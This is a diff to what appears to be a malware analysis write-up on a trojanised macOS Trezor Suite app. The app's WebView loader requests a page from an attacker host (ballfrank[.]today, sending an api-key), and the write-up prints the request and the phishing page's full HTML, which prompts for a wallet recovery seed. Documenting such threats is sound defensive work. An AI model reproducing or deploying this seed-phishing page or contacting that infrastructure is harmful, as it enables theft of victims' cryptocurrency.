@@ -765,7 +765,7 @@ The most interesting element of the replaced Info,plist file are that the malici
     <key>ballfrank[.]today</key>
 ```
 
-The Trezor Suite application is then replaced with a binary which seemingly has no wallet functionality, but instead a WebView loader pointing at attacker infrastructure.
+The Trezor Suite application is then replaced with a binary which seemingly has no wallet functionality, but instead a WebView loader pointing at attacker infrastructure, fingerprinted by the 'API Key'.
 
 ```C
 100000b7c        _objc_storeStrong(location: &location_11, obj: applicationDidFinishLaunching)
@@ -779,3 +779,125 @@ The Trezor Suite application is then replaced with a binary which seemingly has 
 100000bdf            self: _objc_alloc(cls: clsRef_WKWebViewConfiguration), cmd: "init")
 ```
 
+This is what the loader page looks like after executing the trojanised Trezor Suite Application:
+
+<img width="1250" height="810" alt="image" src="https://github.com/user-attachments/assets/b5b07d8a-d5b3-46e2-8bbc-57f23f4353ba" />
+
+Request:
+```
+GET /trezor/start/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514 HTTP/1.1
+Host: ballfrank[.]today
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Sec-Fetch-Site: none
+Connection: keep-alive
+Sec-Fetch-Mode: navigate
+api-key: 5190ef1733183a0dc63fb623357f56d6
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)
+Accept-Language: en-GB,en;q=0.9
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+```
+
+Response:
+```
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/assets/css/bootstrap-icons.min.css" rel="stylesheet">
+    <link href="/assets/css/google-liter.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-weight: 400; /* Стандартный вес для лучшей читаемости */
+            background: url('/assets/wallets/trezor/recover_background.webp') no-repeat center center fixed;
+            background-size: 100% 100%;
+            background-color: #242424;
+            color: #fff;
+            min-height: 100vh;
+            position: relative;
+            z-index: 1;
+        }
+        h1, h2, h3 { /* Для заголовков, как на скриншоте */
+            font-weight: 600; /* Полужирный, но не 700 */
+            font-family: 'Inter', sans-serif;
+        }
+        .sidebar {
+            height: 100vh;
+            position: sticky;
+            top: 0;
+        }
+        .card {
+            background-color: rgba(28, 28, 28, 0.9);
+            border: none;
+            color: #8d8d8d;
+        }
+        .btn-outline-secondary {
+            border-color: #575757;
+            color: #fff;
+            height: 80px;
+            line-height: 60px;
+            font-size: 18px;
+            font-family: 'Inter', sans-serif; /* Применяем к кнопкам */
+            font-weight: 500;
+        }
+        .btn-secondary {
+            background-color: #1C1C1C;
+            border-color: #1C1C1C;
+            color: #fff;
+            border-radius: 20px;
+            font-family: 'Inter', sans-serif;
+        }
+        .main-content {
+            min-height: 80vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <!-- Остальной HTML остаётся без изменений -->
+    <div id="react-root"></div>
+    <div id="ll-modal-root"></div>
+    <div id="hello-world">
+        <div class="container-fluid">
+            <div class="row">
+                <main class="col-14 px-4 text-white" style="padding: 20px;">
+                    <div class="row justify-content-end">
+                        <div class="col-2">
+                            <a href="https://trezor.io/learn/a/recover-wallet-on-model-one" class="btn btn-secondary w-100">Support<svg xmlns="http://www.w3.org/2000/svg" style="margin-left: 3px; vertical-align: -3px;" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 6h-6a2 2 0 0 0 -2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-6" /><path d="M11 13l9 -9" /><path d="M15 4h5v5" /></svg>
+                            </a>
+                        </div>
+                    </div>
+                    <div class="main-content">
+                        <div class="row justify-content-center" style="margin-top: 300px;">
+                            <div class="card col-8">
+                                <div class="card-body text-center">
+                                    <h3>Recover wallet from seed</h3>
+                                    <p>Enter your recovery seed to restore an existing wallet. Select the number of words in your recovery seed.</p>
+                                    <div class="row justify-content-center mb-4" style="margin-top: 50px;">
+                                        <div class="col-4">
+                                            <a href="/trezor/12/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514" class="btn btn-outline-secondary btn-lg w-100">12 words</a>
+                                        </div>
+                                        <div class="col-4">
+                                            <a href="/trezor/18/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514" class="btn btn-outline-secondary btn-lg w-100">18 words</a>
+                                        </div>
+                                        <div class="col-4">
+                                            <a href="/trezor/24/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514" class="btn btn-outline-secondary btn-lg w-100">24 words</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            </div>
+        </div>
+    </div>
+	<script src="/assets/js/bootstrap.min.js"></script>
+	<script src="/assets/js/chart.umd.js"></script>
+</body>
+</html>
+```
